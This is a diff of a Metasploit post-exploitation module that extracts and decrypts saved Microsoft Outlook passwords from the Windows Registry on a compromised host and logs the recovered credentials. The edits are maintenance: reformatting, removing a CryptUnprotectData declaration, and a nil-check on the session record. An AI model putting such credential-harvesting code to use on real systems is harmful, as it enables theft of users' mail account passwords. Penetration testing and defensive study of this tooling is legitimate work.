@@ -3,8 +3,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -21,12 +21,14 @@ class Metasploit3 < Msf::Post
 	def initialize(info={})
 		super( update_info( info,
 				'Name'          => 'Windows Gather Microsoft Outlook Saved Password Extraction',
-				'Description'   => %q{ This module extracts and attempts to decrypt saved Microsoft
-								Outlook (versions 2002-2010) passwords from the Windows
-								Registry for POP3/IMAP/SMTP/HTTP accounts.
-								In order for decryption to be successful, this module must be
-								executed with the same privileges as the user which originally
-								encrypted the password.},
+				'Description'   => %q{
+					This module extracts and attempts to decrypt saved Microsoft
+					Outlook (versions 2002-2010) passwords from the Windows
+					Registry for POP3/IMAP/SMTP/HTTP accounts.
+					In order for decryption to be successful, this module must be
+					executed with the same privileges as the user which originally
+					encrypted the password.
+				},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'Justin Cacak'],
 				'Version'       => '$Revision$',
@@ -40,18 +42,6 @@ class Metasploit3 < Msf::Post
 		rg = session.railgun
 		if (!rg.get_dll('crypt32'))
 			rg.add_dll('crypt32')
-		end
-
-		if (!rg.crypt32.functions["CryptUnprotectData"])
-			rg.add_function("crypt32", "CryptUnprotectData", "BOOL", [
-					["PBLOB","pDataIn", "in"],
-					["PWCHAR", "szDataDescr", "out"],
-					["PBLOB", "pOptionalEntropy", "in"],
-					["PDWORD", "pvReserved", "in"],
-					["PBLOB", "pPromptStruct", "in"],
-					["DWORD", "dwFlags", "in"],
-					["PBLOB", "pDataOut", "out"]
-				])
 		end
 	end
 
@@ -304,11 +294,16 @@ class Metasploit3 < Msf::Post
 				end
 
 				if got_user_pw == 1
+					if session.db_record
+						source_id = session.db_record.id
+					else
+						source_id = nil
+					end
 					report_auth_info(
 						:host  => host,
 						:port => portnum,
 						:sname => type,
-						:source_id => session.db_record.id,
+						:source_id => source_id,
 						:source_type => "exploit",
 						:user => user,
 						:pass => pass)
@@ -316,11 +311,16 @@ class Metasploit3 < Msf::Post
 				end
 
 				if smtp_use_auth != nil
+					if session.db_record
+						source_id = session.db_record.id
+					else
+						source_id = nil
+					end
 					report_auth_info(
 						:host  => smtp_server,
 						:port => smtp_port,
-						:sname => "SMTP",
-						:source_id => session.db_record.id,
+						:sname => "smtp",
+						:source_id => source_id,
 						:source_type => "exploit",
 						:user => smtp_user,
 						:pass => smtp_decrypted_password)
